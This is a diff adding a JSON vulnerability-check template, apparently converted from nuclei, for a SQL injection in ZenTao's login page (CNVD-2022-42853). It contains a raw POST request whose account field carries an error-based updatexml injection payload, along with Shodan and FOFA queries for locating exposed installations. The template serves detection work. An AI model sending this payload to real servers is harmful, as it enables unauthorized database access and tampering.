@@ -1,0 +1,139 @@
+{
+  "id": "CNVD-2022-42853",
+  "name": "ZenTao CMS - SQL Injection",
+  "author": "ling",
+  "severity": "CRITICAL",
+  "description": "ZenTao CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.\n",
+  "references": [
+    "https://github.com/z92g/ZentaoSqli/blob/master/CNVD-2022-42853.go",
+    "https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2022",
+    "zentao",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "Zentao",
+    "shodan": "http.title:\"zentao\""
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-89",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /zentao/user-login.html HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/zentao/user-login.html\n\naccount\u003dadmin\u0027+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+\u00271\u0027\u003d\u00271\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "c8c605999f3d8352d7bb792cf3fdb25"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2022-42853",
+    "info": {
+      "name": "ZenTao CMS - SQL Injection",
+      "author": "ling",
+      "severity": "critical",
+      "description": "ZenTao CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.\n",
+      "reference": [
+        "https://github.com/z92g/ZentaoSqli/blob/master/CNVD-2022-42853.go",
+        "https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-89"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "http.title:\"zentao\"",
+        "fofa_query": "Zentao"
+      },
+      "tags": "cnvd,cnvd2022,zentao,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /zentao/user-login.html HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/zentao/user-login.html\n\naccount\u003dadmin\u0027+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+\u00271\u0027\u003d\u00271\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "c8c605999f3d8352d7bb792cf3fdb25"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
